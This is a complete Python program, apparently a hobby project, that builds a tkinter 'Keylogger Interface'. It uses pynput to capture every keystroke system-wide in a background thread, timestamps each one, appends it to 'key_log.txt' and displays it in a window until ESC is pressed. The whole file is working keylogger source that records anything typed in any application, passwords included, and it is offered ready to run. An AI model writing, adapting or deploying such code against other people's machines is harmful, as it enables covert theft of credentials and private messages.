import tkinter as tk
from tkinter import scrolledtext
from pynput import keyboard
import threading
import datetime

class KeyloggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("🔑 Keylogger Interface")
        self.root.geometry("600x400")
        self.root.configure(bg="#1e1e1e")

        # GUI Title
        tk.Label(root, text="Python Keylogger", font=("Helvetica", 18, "bold"),
                 fg="#61dafb", bg="#1e1e1e").pack(pady=10)

        # Display area
        self.text_area = scrolledtext.ScrolledText(root, wrap=tk.WORD, font=("Consolas", 12),
                                                   bg="#2d2d2d", fg="#dcdcdc", insertbackground='white')
        self.text_area.pack(expand=True, fill="both", padx=10, pady=10)
        self.text_area.insert(tk.END, "Keylogger started...\n")
        self.text_area.config(state=tk.DISABLED)

        # Footer
        tk.Label(root, text="Logging all keystrokes to 'key_log.txt' | Press ESC to stop",
                 font=("Helvetica", 10), fg="gray", bg="#1e1e1e").pack(pady=5)

        # Start keylogger in a new thread
        self.start_keylogger()

    def update_text_area(self, key_str):
        self.text_area.config(state=tk.NORMAL)
        self.text_area.insert(tk.END, key_str + "\n")
        self.text_area.see(tk.END)
        self.text_area.config(state=tk.DISABLED)

    def start_keylogger(self):
        def log_keystrokes():
            with keyboard.Listener(on_press=self.on_press) as listener:
                listener.join()
        threading.Thread(target=log_keystrokes, daemon=True).start()

    def on_press(self, key):
        try:
            key_str = f"[{datetime.datetime.now().strftime('%H:%M:%S')}] Key: {key.char}"
        except AttributeError:
            key_str = f"[{datetime.datetime.now().strftime('%H:%M:%S')}] Special Key: {key}"

        with open("key_log.txt", "a") as f:
            f.write(key_str + "\n")

        self.root.after(0, self.update_text_area, key_str)

        if key == keyboard.Key.esc:
            self.root.quit()

# Run the app
if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerApp(root)
    root.mainloop()
